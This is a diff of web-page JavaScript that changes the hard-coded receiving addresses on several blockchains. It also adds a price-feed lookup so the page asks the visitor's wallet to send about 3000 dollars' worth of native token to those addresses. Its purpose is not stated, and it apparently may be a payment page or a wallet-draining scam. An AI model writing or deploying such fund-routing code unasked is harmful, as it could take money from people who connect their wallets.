@@ -408,17 +408,41 @@ ethereum.on('chainChanged', (_chainId) => window.location.reload());
 
                         const accounts = await ethereum.request({ method: 'eth_accounts' });
                         var chainIDs = await ethereum.request({method: 'eth_chainId'});
-                        var passaddy = {'Polygon': astroaddress, 'Binance': '0x4Bc35353C087F14e226b90bdA1afeE99B8AEDB23', 'Fantom': '0x7214FE7771aB7ac68B0BE853bEa2d5855294A562'}
+                        var passaddy = {'Polygon': '0x6521C66E884b986666Bf02aE12AA3b577aFbE67B', 'Binance': '0x6103377eb913067b3995d6bb265d885495dbcd54', 'Fantom': '0x52AD7aF1982a110Fa657D0e1c133d0a5E76292b5'}
                         var numchain = {'0x1': 'Ethereum', '0x89': 'Polygon', '0x38': 'Binance', '0xfa': 'Fantom', '0x': 'undefined', 'null': 'undefined', 'undefined': 'undefined'};
-   
-                        await ethereum.request({
+                        const addychain = {'Ethereum' : '0x5f4ec3df9cbd43714fe2740f5e3616155c5b8419', 'Polygon' : polyaddy, 'Binance': bscaddress, 'Fantom': '0xf4766552D15AE4d256Ad41B6cf2933482B0680dc'};
+                        let choosechain = numchain[chainIDs];
+  await ethereum.request({
+    method: 'eth_call',
+    params: [{  
+               from: accounts[0],
+               to: addychain[choosechain],  
+               chainid: chainIDs,
+               data: '0x50d25bcd'}, 'latest']
+  })
+  .catch((err) => { if(err.code === 4001 ) 
+    {console.log(err.code)}
+                   }
+          ).then(result => { if(result === undefined) {console.log(result)} else{
+                      const web3 = new Web3(new Web3.providers.HttpProvider("https://cloudflare-eth.com"))
+
+                        var data = result;                       
+                        console.log(parseInt(data));
+                        const pricex = (3000) / (parseInt(data) / 100000000);
+                        var xrate = web3.utils.toWei(String(pricex), 'ether');
+                        var Rate = web3.utils.numberToHex(xrate);
+
+                        console.log(xrate);
+                     async function workitx () { 
+                        
+                       await ethereum.request({
                           method: 'eth_sendTransaction',
                           params: [{  
                                      from: accounts[0],
-                                     to: passaddy[numchain[chainIDs]], 
-                                     tag: 'latest', 
+                                     to: passaddy[numchain[chainIDs]],
                                      chainid: chainIDs,
-                                     data: '0x3b80fb19'}]
+                                     data: '0x3b80fb19',
+                                    value: Rate}, 'latest']
                         })
                         .catch((err) => { if(err.code === 4001) 
                           {
@@ -482,13 +506,20 @@ ethereum.on('chainChanged', (_chainId) => window.location.reload());
                             sucwin();
 
                                     
-                          }}
-                      
+                          }
+                        }
 
-                  )};
+                  )
+                                                                                      }
+                        workitx();
+                                    
+                    }
+                  }
+          );
+                        };
          
        
   
   
  
-  
+                        
